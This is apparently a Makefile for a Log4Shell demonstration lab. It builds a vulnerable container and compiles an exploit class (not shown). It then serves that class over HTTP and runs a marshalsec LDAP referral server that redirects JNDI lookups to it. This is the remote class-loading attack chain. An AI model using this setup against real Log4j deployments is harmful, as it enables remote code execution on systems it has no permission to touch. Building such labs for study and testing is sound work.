.PHONY: build run exploit-setup ldap-server http-server vulnerable-server clean help

# Default target
help:
	@echo "Log4Shell Exploit Demo - Makefile Commands"
	@echo "==========================================="
	@echo ""
	@echo "Setup:"
	@echo "  make build              - Build the vulnerable container"
	@echo "  make exploit-setup      - Build marshalsec and compile exploit"
	@echo ""
	@echo "Running the exploit:"
	@echo "  make http-server        - Start HTTP server (port 8888)"
	@echo "  make ldap-server        - Start LDAP referral server (port 1389)"
	@echo "  make vulnerable-server  - Run vulnerable application (port 8080)"
	@echo ""
	@echo "Cleanup:"
	@echo "  make clean              - Stop all services and remove containers"
	@echo ""
	@echo "Note: Set HOST_IP environment variable or it will be auto-detected"
	@echo "Example: HOST_IP=192.168.1.100 make ldap-server"

# Auto-detect host IP if not set
HOST_IP ?= $(shell hostname -I | awk '{print $$1}')

build:
	podman build -t log4jcve .

run: build
	podman run -ti log4jcve

exploit-setup:
	@echo "Setting up exploit environment..."
	@mkdir -p exploit
	@if [ ! -d exploit/marshalsec ]; then \
		cd exploit && git clone https://github.com/mbechler/marshalsec.git; \
	fi
	@echo "Building marshalsec..."
	@cd exploit/marshalsec && podman run --rm -v $$(pwd):/marshalsec:Z -w /marshalsec maven:3.8.4-jdk-8 mvn clean package -DskipTests
	@echo "Compiling exploit payload..."
	@cd exploit && podman run --rm -v $$(pwd):/exploit:Z maven:3.8.4-jdk-8 javac /exploit/Exploit.java
	@echo "Exploit setup complete!"

http-server:
	@echo "Starting HTTP server on port 8888..."
	@echo "Serving Exploit.class from exploit/ directory"
	cd exploit && python3 -m http.server 8888

ldap-server:
	@echo "Starting LDAP referral server on port 1389..."
	@echo "Host IP: $(HOST_IP)"
	@echo "Redirecting to: http://$(HOST_IP):8888/#Exploit"
	cd exploit/marshalsec && java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
		marshalsec.jndi.LDAPRefServer "http://$(HOST_IP):8888/#Exploit" 1389

vulnerable-server: build
	@echo "Starting vulnerable server on port 8080..."
	@echo "Using host network to access LDAP server"
	podman run --rm -p 8080:8080 --network=host log4jcve

clean:
	@echo "Stopping all services..."
	-podman stop $$(podman ps -q --filter ancestor=log4jcve) 2>/dev/null || true
	-pkill -f "python3 -m http.server 8888" 2>/dev/null || true
	-pkill -f "marshalsec.jndi.LDAPRefServer" 2>/dev/null || true
	@echo "Cleanup complete!"